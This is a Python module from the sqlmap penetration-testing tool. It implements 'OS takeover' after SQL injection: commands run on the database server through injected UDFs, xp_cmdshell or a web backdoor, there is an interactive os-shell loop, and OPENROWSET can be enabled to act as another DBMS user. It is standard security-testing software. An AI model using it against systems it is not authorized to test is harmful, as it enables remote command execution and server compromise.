#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import sys

from extra.safe2bin.safe2bin import safechardecode
from lib.core.common import dataToStdout
from lib.core.common import Backend
from lib.core.common import getSQLSnippet
from lib.core.common import getUnicode
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import AUTOCOMPLETE_TYPE
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.shell import autoCompletion
from lib.request import inject
from lib.takeover.udf import UDF
from lib.takeover.web import Web
from lib.takeover.xp_cmdshell import XP_cmdshell


class Abstraction(Web, UDF, XP_cmdshell):
    """
    This class defines an abstraction layer for OS takeover functionalities
    to UDF / XP_cmdshell objects
    """

    def __init__(self):
        self.envInitialized = False
        self.alwaysRetrieveCmdOutput = False

        UDF.__init__(self)
        Web.__init__(self)
        XP_cmdshell.__init__(self)

    def execCmd(self, cmd, silent=False):
        if self.webBackdoorUrl and not isStackingAvailable():
            self.webBackdoorRunCmd(cmd)

        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            self.udfExecCmd(cmd, silent=silent)

        elif Backend.isDbms(DBMS.MSSQL):
            self.xpCmdshellExecCmd(cmd, silent=silent)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise SqlmapUnsupportedFeatureException(errMsg)

    def evalCmd(self, cmd, first=None, last=None):
        retVal = None

        if self.webBackdoorUrl and not isStackingAvailable():
            retVal = self.webBackdoorRunCmd(cmd)

        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            retVal = self.udfEvalCmd(cmd, first, last)

        elif Backend.isDbms(DBMS.MSSQL):
            retVal = self.xpCmdshellEvalCmd(cmd, first, last)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise SqlmapUnsupportedFeatureException(errMsg)

        return safechardecode(retVal)

    def runCmd(self, cmd):
        getOutput = None

        if not self.alwaysRetrieveCmdOutput:
            message = "do you want to retrieve the command standard "
            message += "output? [Y/n/a] "
            getOutput = readInput(message, default="Y")

            if getOutput in ("a", "A"):
                self.alwaysRetrieveCmdOutput = True

        if not getOutput or getOutput in ("y", "Y") or self.alwaysRetrieveCmdOutput:
            output = self.evalCmd(cmd)

            if output:
                conf.dumper.string("command standard output", output)
            else:
                dataToStdout("No output\n")
        else:
            self.execCmd(cmd)

    def shell(self):
        if self.webBackdoorUrl and not isStackingAvailable():
            infoMsg = "calling OS shell. To quit type "
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        else:
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                infoMsg = "going to use injected sys_eval and sys_exec "
                infoMsg += "user-defined functions for operating system "
                infoMsg += "command execution"
                logger.info(infoMsg)

            elif Backend.isDbms(DBMS.MSSQL):
                infoMsg = "going to use xp_cmdshell extended procedure for "
                infoMsg += "operating system command execution"
                logger.info(infoMsg)

            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise SqlmapUnsupportedFeatureException(errMsg)

            infoMsg = "calling %s OS shell. To quit type " % (Backend.getOs() or "Windows")
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        autoCompletion(AUTOCOMPLETE_TYPE.OS, OS.WINDOWS if Backend.isOs(OS.WINDOWS) else OS.LINUX)

        while True:
            command = None

            try:
                command = raw_input("os-shell> ")
                command = getUnicode(command, encoding=sys.stdin.encoding)
            except KeyboardInterrupt:
                print
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ("x", "q", "exit", "quit"):
                break

            self.runCmd(command)

    def _initRunAs(self):
        if not conf.dbmsCred:
            return

        if not conf.direct and not isStackingAvailable():
            errMsg = "stacked queries are not supported hence sqlmap cannot "
            errMsg += "execute statements as another user. The execution "
            errMsg += "will continue and the DBMS credentials provided "
            errMsg += "will simply be ignored"
            logger.error(errMsg)

            return

        if Backend.isDbms(DBMS.MSSQL):
            msg = "on Microsoft SQL Server 2005 and 2008, OPENROWSET function "
            msg += "is disabled by default. This function is needed to execute "
            msg += "statements as another DBMS user since you provided the "
            msg += "option '--dbms-creds'. If you are DBA, you can enable it. "
            msg += "Do you want to enable it? [Y/n] "
            choice = readInput(msg, default="Y")

            if not choice or choice in ("y", "Y"):
                expression = getSQLSnippet(DBMS.MSSQL, "configure_openrowset", ENABLE="1")
                inject.goStacked(expression)

        # TODO: add support for PostgreSQL
        #elif Backend.isDbms(DBMS.PGSQL):
        #    expression = getSQLSnippet(DBMS.PGSQL, "configure_dblink", ENABLE="1")
        #    inject.goStacked(expression)

    def initEnv(self, mandatory=True, detailed=False, web=False, forceInit=False):
        self._initRunAs()

        if self.envInitialized and not forceInit:
            return

        if web:
            self.webInit()
        else:
            self.checkDbmsOs(detailed)

            if mandatory and not self.isDba():
                warnMsg = "functionality requested probably does not work because "
                warnMsg += "the curent session user is not a database administrator"

                if not conf.dbmsCred and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                    warnMsg += ". You can try to use option '--dbms-cred' "
                    warnMsg += "to execute statements as a DBA user if you "
                    warnMsg += "were able to extract and crack a DBA "
                    warnMsg += "password by any mean"

                logger.warn(warnMsg)

            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                success = self.udfInjectSys()

                if success is not True:
                    msg = "unable to mount the operating system takeover"
                    raise SqlmapFilePathException(msg)
            elif Backend.isDbms(DBMS.MSSQL):
                if mandatory:
                    self.xpCmdshellInit()
            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise SqlmapUnsupportedFeatureException(errMsg)

        self.envInitialized = True
